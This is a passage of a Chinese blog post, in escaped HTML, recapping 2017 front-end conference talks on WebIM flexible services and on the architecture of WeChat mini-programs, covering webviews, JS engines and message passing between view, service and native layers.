src=\"https://user-gold-cdn.xitu.io/2017/9/17/98dcea255f9a851e052f576277797146\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b438786525539013342949285e1c4af6\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/eb10dd2cc7c936ed2c4c9a7788db9b9b\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/6a571ac5e5c031ce0f32f7350577d91e\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/77c84ab9881030e2a7f083621dbaf469\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/cab34055cd8707b297d7282526481028\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/192812fcea5a365c9e16d8678dfd8199\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/567e609419df4a1595f7760c49d439fd\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/28ea3fbaafa619a8af57b1d458db8754\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b2d12235f1fff0999c3641c517ea25fb\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b17b721ce4f3fb1e6dd71fa8cc5f4c94\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/bc85a4487dde80324a568450f4b89ea1\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/59bc94408e7ec9b7c69406a411bcd84e\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/1efc5edf26b0253b9aefbed02b388834\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/97fffee822fb4a796823137bc4f727ec\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/31968d95f11095704f432980f6ebb822\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b0a6d02e3b084076ac53c7acd8ef0d44\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/8f0ceb24ba611037b9d41bcf98f7c08c\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/9754e59f84acc6ef52568bae9805c886\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/86ad9b18b355159fd91f725a36506119\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/ff55997e45fc1cede699c14376e88916\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/1a92d98548bcb67490fc198ef155adda\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/32181164fc4ac99e2475f3918264311d\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/f61507d84dcfe34b63f7d40cbb9042ce\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b4944d4ed21159dc8537f3e0ff80a236\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/d37304fcfc9ae04e08b0e30c42bc4108\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/fe457d2fae699e485ec4424f39486099\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/03f803f30cd75d42c6d265b7641f6cd5\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/e7d7c4f2f1758f00eb0a67cedbedacac\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/341a7d4bdcd05fc666050dcff2483bec\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/c3a2cd037e6836289301f2d2ba311bc1\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003ch2\u003e二、《WebIM大流量柔性服务》-- 唐俊俊\u003c/h2\u003e\u003cp\u003e--- 旁边美女说，台上的讲师是不是在念稿子的啊，怎么可能说的那么快呢？\u003c/p\u003e\u003cp\u003e主要是讲在局域网网环境中开发第三方即时IM，没接触过的楼主在下面听得有点蒙（闲鱼呆滞），介绍企业WebIM的特点，Socket.IO架构/技术选型，跨进进程消息发送和nconp框架。\u003c/p\u003e\u003cp\u003e(我没记错的话，所谓柔性化处理是在对在websocket占用服务端资源峰值与低估差的距大时采取长轮询减少峰值、低估，以达到稳定的区间。)\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/10e796cb83407101c3f483201e5283ce\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/8c1cddc934cfe27592e158d6c81c417d\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/aaf39e3d17ee3918db9db09b3e2a4246\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/cc3036afe5b7555368ba3349a973e745\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/127ad1eaee9fd2ccfdc0c9349f213c00\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e三、《小程序你所不知道的：核心架构剖析》-- 王跃\u003c/h2\u003e\u003cp\u003e(感谢王跃老师分享的ppt)\u003cbr\u003e\u003cbr\u003e王跃老师：大家好，我今天分享的主题叫：《小程序你所不知道的：核心架构剖析》，首先声明下，我不是知识的原创者，我只是知识的搬运工，为什么这么说呢，大家都知道，我\n们小程序的同事每天都忙着在半夜给大家发布新功能（这不昨晚又发布了1.0beta版开发者工具），自然也就没时间给大家做分享了，所以今天呢，我就自告粪勇，帮大家把小程序底层实现的一些逻辑和涉及到的关键技术给梳理了下，算是抛砖引玉，希望能对各位现在或者今后的工作有帮助。讲得不好呢， 大家喷我就行，与小程\n序的同事无关哈。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/cad450471a320a5b526a4647b2617fec\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e我想，在做的各位应该都不熟悉我，虽然断断续续做了10多年了前端，但是作为这么牛逼的前端会议的分享嘉宾，实属首次，所以有点紧张，请大家见谅，接下来还是按照惯例，给大家做下自我介绍！\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\n\n\n\n\u003c/p\u003e\u003cp\u003e我叫王跃，来自腾讯互娱，对，没错，就是那个传说年终奖几百万的部门（当然我没这么多啦）我学的就是计算机，毕业后一直从事开发的工作，在搜狐做过SNS白社会，在新浪做过微博，现在在腾讯做道聚城项目，中途还创了2次业。有想交流创业经历的朋友下来我们也可以单聊哈。那闲话不多说，接了下来我们进入正题。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/1fd2e08e4fcd327525433b9eb9bc47ef\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e今天分享包括3部分，xxx，会很快带过去，xxx和xxx会重点讲，好。。。。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/2bbf06fa78a121547a8d64ef5d972e57\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch3\u003e一、基本概况\u003c/h3\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e非官方统计，腾讯内部各个部门发布的小程序呢，已经超过***款，后面会给大家展示一下。\u003c/p\u003e\u003cp\u003e而整个小程序生态，无官统，敏感，没预估的火爆，但看到，整行的关投都在不断的增加，而微信与微信生态整合，毕竟微信有近10亿用户，1~2年后，小程序会成为新产品发布的首选形式和渠道，特别是对于创业公司，所以今分很有价值。(此处省略N字...)\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/73316212396f73910bf61bdd1645fe9e\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e已经发布的小程序整体体验来说，还是很不错的，唯一需要积累和改变的就是用户习惯。比如我之前很多时候还是习惯用摩拜app来扫码，而不是微信，唯一阻碍我的其实就是习惯，但是在各种渠道持续提醒我使用小程序的时候，我现在也就开始使用膜拜小程序了。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/a39732a85817df8d3dac6751ea766751\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003echrome相关的技术：webkit，v8，nwjs，devtools,extension等，涉及很多种框架，整个实现，相对还是比较复杂的，当然我们今天不会细讲涉及到每一种技术啦，关键还是分析小程序整体架构和核心技术点。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/65a5941653fc3c5cafe028e5c07b2b4a\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e开发者工具，整体基于nwjs平台，用react前端框架实现，并且综合了chrome\ndevtools，extension和Monaco在线代码编辑器整合而成，自从atom出来后，很多客户端都可以基于web平台和技术来实现，跨平台，组件化，开放生态，所以非常方便。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/8b7502ce214d37706c0a6a8259530c70\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e不知道在座有多少人做过小程序开发，然后又有多少人把发布后的小程序包解压后研究过，不过没看过也关系，这里我们就一起来看下：开发目录，wxa的压缩包，解压看到，目录结构基本一致，然后主要注入了提供基础能力的库文件。具体文件的功能这里给大致介绍一下。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/c67f84f034341a608cd65942e699cae0\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/6bb25ced14dca660a97ceaf3b5cea5b1\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch3\u003e二、整体架构\u003c/h3\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/9977ca56149106f635a791baebd327aa\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e树形结构图，粗粒度拆分下的话，小程序由三部分来组成，看得见的部分view，看不见的部分service，附属配置（看得见和看不见），先分析View，到native，再分享service到native，然后再讲view，service到native的双向通信，view到service的双向通信，native到view，service的单向通讯。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/a0240c1e33660ff99f96f7ef47fb8a4e\"\u003e\u003c/p\u003e\u003cp\u003e众所周知，小程序的每一个page，有4个文件，WXML，WXSS,\nJS,JSON，我们这里把WXML和WXSS定义为View部分，由一个webview承载，几个page就会打开几个webview，而JS和JSON的代码我们定义为Service部分，也就是我们的主要的业务逻辑部分，它承载环境这里没有标注，后面我会详细讲，因为平台不同有不同的承载方式，最下面是Native部分，提供基础能力，三部分之间的通讯是通过消息的方式来实现的，这个后面也会详细讲到消息的流动路径。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/dd1745d07f14ec8b315ce5b9f480eb9c\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e前面讲到，view和service是分开的，我想问下，$(‘#id’)这种方式还能用吗？不用着急回答，大家可以思考一下，如果不能用，那是从技术上是否以实现，怎么实现？\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/12520cda8ac8c1f5cf8295fe849c2442\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e第二部分，实现的技术细节，也是今天最重要的部分，希望大家还没睡着~~~没睡着的同学可以叫一下旁边已经睡着的同学们，接下来都是干货哦。。。。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/fe2e634d6c0102e6c265ea9d73c8131b\"\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/dc61de51f6c74de3002e77d6a1f0790d\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e涉及三个平台，而不同平台的实现又不一致，所以我这里会按平台分开了来分析。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/66429b9624c127a58ec7c2c1ba71ef0b\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cu\u003e首先搞清楚哪部分是View\u003c/u\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/6792697cb321b57e380fef03a5f25959\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e还是回到我们之前解压的这个文件包来看。。。。我们这里把View具化到文件上，主要就三个文件，wawebview,page-frame,xxxx.html,那这里的View问题就变成了在不同的平台下小程序是用什么环境来执行他们的，并且怎么和其它部分通信的，很明显在pc上，开发者工具是基于nwjs，node+webkit实现的，所以。。。。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/e52ee5aad9341c21f79430b0bd88971a\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e所有页面都用一个模板文件来负责加载,相关的js都会注入到这个模板文件。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/bd5850e5d556709d8372d9032bdabd2c\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/f1e65898a9adee70842b7026ecab0cd4\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003ewkwebview+webview，这个其实跟webkit原理一样jscore webcore webkit。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/99fc30732fe923234d30b047b8d1d005\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e记得将多个webview的好处，并行，隔离，简单，高效，以内存换效率。（红色表示最重要、最核心的部分）\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/62594d3536ef0c81bd485091bf0c9eec\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/c586b9bd5c5bdffe73b0ed95611f798d\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e搞清楚哪部分是Service，还是回到我们之前解压的这个文件包来看。。。。我们这里把Service具化到文件上，主要就三个js文件，waservice,app-config,app-service.js,这里的Service问题就变成了在不同的平台下小程序是用什么环境来执行他们的，并且怎么和其它部分通信的。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/20ce7f7514600c525c164c55ec10d713\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e搞清楚哪部分是Service，还是回到我们之前解压的这个文件包来看。。。。我们这里把Service具化到文件上，主要就三个js文件，waservice,app-config,app-service.js,这里的Service问题就变成了在不同的平台下小程序是用什么环境来执行他们的，并且怎么和其它部分通信的。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/6f1fe6cac856f7833734d1937955b6d7\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003ePC的Serivice也是一个运行在Chrome中的一个html页面，这个页面加载了三部分JS，这里我们可以清晰的看到。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/37a5c6580bda0a9ce01774493f6643be\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/fa78ba9d27801287e950b4c2167bacb1\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eJavaScriptCore是webkit的一个重要组成部分，主要是对JS进行解析和提供执行环境。代码是开源的。iOS7后苹果在iPhone平台推出，极大的方便了我们对js的操作。我们可以脱离webview直接运行我们的js。\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/08f9d8b1abb3c88063871dcfe41236a2\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/b8f50f56de647c11a2399da7a120af61\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eV8是一个由丹麦Google开发的开源JavaScript引擎，用於Google\nChrome中，V8在执行之前将JavaScript编译成了机器码，而非直译它，以此提升效能。这里的v8不是原版的v8系统，而是x5提取出来的一个版本。（红色表示最重要、最核心的部分）\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/1a78d50e45b2e5382b398c85bdf1fc34\"\u003e\u003c/p\u003e\u003cp\u003e模块实现，App，Page，getApp，getCurrentPages等，wx.xxx下面所有的方法，\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/cbef30e57fc6af74f1f84c824e585f53\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003eMessage\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/7d165cab6a8a1fcb567b927a37a0b5cc\"\u003e\u003c/p\u003e\u003cp\u003e通过window.postMessage实现（使用chrome扩展的接口注入一个contentScript.js，它封装了postMessage方法，实现tab之间的通信，并且也它通过chrome.runtime.connect直接操作chrome\nnative原生） \u003cbr\u003e\n\u003c/p\u003e\u003cp\u003e发送消息：\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003ewindow.postMessage(data, ‘*’);，// data里指定 webviewID\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接收消息：\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003ewindow.addEventListener(‘message’, messageHandler);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e在contentScript里面看到一句话，证实了appservice也是通过一个webview实现的，实现原理上跟view一样，只是处理的业务逻辑不一样\n\u003c/p\u003e\u003cp\u003e\n\n\n\n\n\n\n\n\n\n\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-string\"\u003e'webframe'\u003c/span\u003e === b ? postMessageToWebPage(a) : \u003cspan class=\"hljs-string\"\u003e'appservice'\u003c/span\u003e === b \u0026amp;\u0026amp; postMessageToWebPage(a) \u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/e75b8a4de2b6ab9ad02ce139a0339aaa\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/eb496f38c58dd8d36c112816ad054d2e\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/6a520ed408dbe1bcd7a4f07ee7165e47\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/ecca7982f8bd1105a56c120fa430c0ba\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/78f5c008a209fef5b72195e72d960821\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/3489ce3bfba29fa9fec3512d741b6441\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/e594a9b3a5d5d26685c6be2cc676b9bd\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e通过 WKWebview的\u003c/p\u003e\u003cp\u003ewindow.webkit.messageHandlers.NAME.postMessage\u003c/p\u003e\u003cp\u003e实现,微信navite代码里实现了两个handler消息处理器\u003c/p\u003e\u003cp\u003e1、invokeHandler: 调用原生能力\u003c/p\u003e\u003cp\u003e\n\n\n\n\n\n\n\n\u003c/p\u003e\u003cp\u003e2、publishHandler: 消息分发\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/902139b50f84cfe915a80a39348aa141\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/dde3dfe0b7a7540a8cadf48605d9ef98\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e通过 WKWebview的\u003c/p\u003e\u003cp\u003ewindow.webkit.messageHandlers.NAME.postMessage\u003c/p\u003e\u003cp\u003e实现,微信navite代码里实现了两个handler消息处理器\u003c/p\u003e\u003cp\u003e1、invokeHandler: 调用原生能力\u003c/p\u003e\u003cp\u003e\n\n\n\n\n\n\n\n\u003c/p\u003e\u003cp\u003e2、publishHandler: 消息分发\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/355631b2472d379d7c1087b462851135\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003eCompent --- 对比Polymer与小程序\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/3e3f88c17f32c77d5c1f1ec8663b1c21\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e王跃老师：“这里有人应该会问小程序为什么没有采用Polymer？ 这里微信团队同事说唤醒WebView也需要消耗的，大概耗费300ms，所以性能是瓶颈。然后他们自己重写了类Polymer的形式，性能差不多（王跃老师说他们谦虚了）”。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/ceca383a63e560815480c1262f11092d\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/bc7bceabe3172be82545cf00ea4e2380\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e以下截图为分析内容：\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/b3865d781e08a59e39ad61ef581ed848\"\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/067b1f488b219324a670704ff18023a3\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/e78d6246c1d97ba143a8faf8fd576e9c\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003cb\u003eOptimize\u003c/b\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003epage：一般不超过5个，超过后小程序就会自动复用\u003c/li\u003e\u003cli\u003esize： 一般不超过2M\u003c/li\u003e\u003cli\u003eDom： 一般不超过16000\u003c/li\u003e\u003cli\u003eData： 会占用内存，数据传输jsBridge会耗时，只要\u003ccode\u003esetData\u003c/code\u003e自己有用的资源就可以了\u003c/li\u003e\u003cli\u003e动画：可以用css3解决\u003c/li\u003e\u003cli\u003e请求：小程序使用的是service 